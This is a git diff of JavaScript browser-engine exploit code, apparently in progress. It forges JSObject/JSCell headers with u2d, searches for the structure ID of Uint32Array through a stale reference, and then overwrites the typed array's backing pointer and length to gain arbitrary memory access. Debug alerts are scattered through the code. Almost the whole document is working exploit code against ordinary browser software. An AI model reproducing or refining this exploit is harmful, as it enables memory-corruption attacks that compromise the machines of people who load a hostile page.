@@ -172,17 +172,23 @@ for (var i = 0; i < 0x1000; i++){
 				//var original_val = bufs[i][k];
 				//var original_val1 = bufs[i][k+1];
 				
-				bufs.push(stale);
+				//bufs.push(stale);
 				stale[0] = fc;
                         	fcp = bufs[i][k];
 				structID = 100;
+				stale[0] = {
+				    'a': u2d(structID, 0x1172600), // the JSObject properties
+				    'b': u2d(0, 0), // Butterfly ptr
+				    'c': smsh, // var smsh = new Uint32Array(0x10)
+				    'd': u2d(0x100, 0)
+				}
+				/*
 				stale[0] = {
 				    'a': u2d(structID, 0), // the JSObject properties
 				    'b': {1:1, 2:2, 3:3, 4:4, 5:5, 6:6}, //u2d(0, 0), // Butterfly ptr
 				    'c': smsh, // var smsh = new Uint32Array(0x10)
 				    'd': u2d(0x100, 0)
 				}
-				/*
 				stale[0] = {
 					// 'a' is the forged JSCell header
 					// m_structureID = 105 // Struct ID for Uint32ArrayType (Changes on runtime, how did this work?)
@@ -201,31 +207,29 @@ for (var i = 0; i < 0x1000; i++){
 				
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
-				
-				/*
-				dgc();a
-				dgc();
-				dgc();
-				dgc();
-				
-				alert("Gonna access stale");
-				sa = d2u(stale[1]['a']);
-				alert("sa.hi=" + sa.hi);
-				alert("sa.low=" + sa.low);
-				
-				alert("After accesing stale");
-				*/
+
 				while(!(stale[0] instanceof Uint32Array)) {
-				    alert("In while i:" + i + ", k:" + k);
 				    structID++;
 				    stale[1]['a'] = u2d(structID, 0);
-				    //alert(structID);
 				}
 				alert('found structID for Uint32Array = '+structID);
 				alert('stale[0] is now: '+stale[0]);
-				//bufs[i][k] = original_val;
-				//bufs[i][k+1] = original_val1;
+
+				bck = stale[0][4];
+ 				stale[0][4] = 0; // address, low 32 bits
+ 				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
+ 				stale[0][6] = 0xffffffff;
+ 				mem0 = stale[0];
+ 				mem1 = bck;
+ 				mem2 = smsh;
+ 				bufs.push(stale)
+				alert("Done doing stuff I don't understand");
 				
+ 				if (smsh.length != 0x10) {
+ 					smashed(stale[0]);
+ 				}
+				
+				/*
 				sleep(2000);
 				alert("busywaited for 5 seconds");
 				setTimeout(function(){
@@ -234,6 +238,7 @@ for (var i = 0; i < 0x1000; i++){
 					var b = a;
 					alert("b == null: " + b === null);
 				}, 5000);
+				*/
  				return;
  			}
  		}
